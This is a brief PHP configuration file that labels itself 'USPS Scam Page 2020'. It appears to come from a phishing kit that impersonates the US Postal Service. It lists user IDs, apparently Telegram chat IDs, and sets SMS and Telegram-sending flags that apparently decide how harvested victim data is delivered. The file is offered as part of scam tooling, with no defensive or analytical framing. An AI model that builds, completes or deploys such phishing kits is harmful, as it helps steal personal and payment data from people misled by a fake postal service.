<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("-502725005", "535598454");
$sms='1';
$error='0';
$sendtele = false;
?>
